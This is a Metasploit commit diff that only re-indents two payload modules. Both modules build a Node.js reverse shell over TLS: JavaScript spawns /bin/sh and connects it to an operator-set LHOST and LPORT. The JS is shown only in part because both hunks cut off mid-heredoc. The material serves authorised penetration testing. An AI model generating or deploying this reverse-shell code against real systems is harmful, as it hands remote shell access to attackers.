c953cb9c3967c81cb235c777e0325bd5acbc8db9
Tab Assassin <tabassassin@metasploit.com>
2013-09-05 16:17:40 -0500

    Retab changes for PR #1489

--- modules/payloads/singles/cmd/unix/reverse_js_ssl.rb
+++ modules/payloads/singles/cmd/unix/reverse_js_ssl.rb
@@ -13,47 +13,47 @@ require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
-	include Msf::Payload::Single
-	include Msf::Sessions::CommandShellOptions
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Reverse TCP SSL (via JS)',
-			'Description'   => 'Creates an interactive shell via JS, uses SSL',
-			'Author'        => 'RageLtMan',
-			'License'       => BSD_LICENSE,
-			'Platform'      => 'unix',
-			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcpSsl,
-			'Session'       => Msf::Sessions::CommandShell,
-			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'js',
-			'Payload'       =>
-				{
-					'Offsets' => { },
-					'Payload' => ''
-				}
-			))
-	end
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'          => 'Unix Command Shell, Reverse TCP SSL (via JS)',
+      'Description'   => 'Creates an interactive shell via JS, uses SSL',
+      'Author'        => 'RageLtMan',
+      'License'       => BSD_LICENSE,
+      'Platform'      => 'unix',
+      'Arch'          => ARCH_CMD,
+      'Handler'       => Msf::Handler::ReverseTcpSsl,
+      'Session'       => Msf::Sessions::CommandShell,
+      'PayloadType'   => 'cmd',
+      'RequiredCmd'   => 'js',
+      'Payload'       =>
+        {
+          'Offsets' => { },
+          'Payload' => ''
+        }
+      ))
+  end
 
-	#
-	# Constructs the payload
-	#
-	def generate
+  #
+  # Constructs the payload
+  #
+  def generate
     # Future proof for PrependEncoder
     ret = super + command_string
     # For copy-paste to files or other sessions
-		vprint_good(ret)
-		return ret
-	end
+    vprint_good(ret)
+    return ret
+  end
 
-	#
-	# Returns the command string to use for execution
-	#
-	def command_string
+  #
+  # Returns the command string to use for execution
+  #
+  def command_string
 
  		lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
-		cmd   = <<EOS
+    cmd   = <<EOS
 var tls = require("tls"), spawn = require("child_process").spawn, util = require("util"), sh = spawn("/bin/sh",[]);
 var client = this;
 client.socket = tls.connect(#{datastore['LPORT']},"#{lhost}", function() {
--- modules/payloads/singles/js/shell_reverse_tcp_ssl.rb
+++ modules/payloads/singles/js/shell_reverse_tcp_ssl.rb
@@ -13,46 +13,46 @@ require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
-	include Msf::Payload::Single
-	include Msf::Sessions::CommandShellOptions
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Command Shell, Reverse TCP SSL (via JS)',
-			'Description'   => 'Creates an interactive shell via JS, uses SSL',
-			'Author'        => 'RageLtMan',
-			'License'       => BSD_LICENSE,
-			'Platform'      => 'unix',
-			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcpSsl,
-			'Session'       => Msf::Sessions::CommandShell,
-			'PayloadType'   => 'js',
-			'Payload'       =>
-				{
-					'Offsets' => { },
-					'Payload' => ''
-				}
-			))
-	end
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'          => 'Command Shell, Reverse TCP SSL (via JS)',
+      'Description'   => 'Creates an interactive shell via JS, uses SSL',
+      'Author'        => 'RageLtMan',
+      'License'       => BSD_LICENSE,
+      'Platform'      => 'unix',
+      'Arch'          => ARCH_CMD,
+      'Handler'       => Msf::Handler::ReverseTcpSsl,
+      'Session'       => Msf::Sessions::CommandShell,
+      'PayloadType'   => 'js',
+      'Payload'       =>
+        {
+          'Offsets' => { },
+          'Payload' => ''
+        }
+      ))
+  end
 
-	#
-	# Constructs the payload
-	#
-	def generate
+  #
+  # Constructs the payload
+  #
+  def generate
     # Future proof for PrependEncoder
     ret = super + command_string
     # For copy-paste to files or other sessions
-		vprint_good(ret)
-		return ret
-	end
+    vprint_good(ret)
+    return ret
+  end
 
-	#
-	# Returns the JS string to use for execution
-	#
-	def command_string
+  #
+  # Returns the JS string to use for execution
+  #
+  def command_string
     # Does anyone know of a concise way to tell if we're running on windows so that we spawn cmd?
  		lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
-		cmd   = <<EOS
+    cmd   = <<EOS
 var tls = require("tls"), spawn = require("child_process").spawn, util = require("util"), sh = spawn("/bin/sh",[]);
 var client = this;
 client.socket = tls.connect(#{datastore['LPORT']},"#{lhost}", function() {
